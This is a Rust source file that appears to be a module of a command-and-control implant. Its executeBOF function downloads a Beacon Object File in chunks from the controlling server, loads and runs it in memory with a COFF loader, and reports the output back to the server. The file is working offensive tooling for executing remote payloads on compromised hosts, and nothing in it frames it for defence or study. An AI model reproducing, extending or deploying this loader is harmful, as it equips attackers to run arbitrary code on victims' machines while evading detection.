use coffeeldr::CoffeeLdr;
use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use std::io::{Cursor, Read};
const CHUNK_SIZE: usize = 4096;
use std::path::PathBuf;


#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    parameters: String,
}

pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract fields
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: UploadParams = serde_json::from_str(raw)?;
    let file_id = &params.file_id;

    // 2. Download chunks into buffer
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            "action": "post_response",
            "responses": [{
                "upload": {
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                },
                "task_id": id
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp["responses"][0];
        total_chunks = entry["total_chunks"].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry["chunk_data"].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }


    // 3. Load & run COFF from buffer
    use coffeeldr::BeaconPack;

    let mut output = String::new();
    let params_str = params.parameters.trim();

    match CoffeeLdr::new(file_bytes.as_slice()) {
        Ok(mut ldr) => {
            output.push_str("COFF loaded!\n");

            if params_str.is_empty() {
                match ldr.run("go", None, None) {
                    Ok(res) => output.push_str(&res),
                    Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                }
            } else {
                let mut pack = BeaconPack::default();

                for arg in params_str.split_whitespace() {
                    if let Err(e) = pack.addstr(arg) {
                        output.push_str(&format!("Arg error ({}): {}\n", arg, e));
                    }
                }

                match pack.get_buffer_hex() {
                    Ok(buf) => {
                        let ptr = buf.as_ptr() as *mut u8;
                        let len = buf.len();

                        match ldr.run("go", Some(ptr), Some(len)) {
                            Ok(res) => output.push_str(&res),
                            Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                        }

                        std::mem::forget(buf); // ensure memory lives during run
                    }
                    Err(e) => {
                        output.push_str(&format!("Pack error: {}\n", e));
                    }
                }
            }
        }
        Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
    }



    // 4. Send final response
    let done = json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": output,
            "agent_file_id": file_id,
            "status": "success"
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}
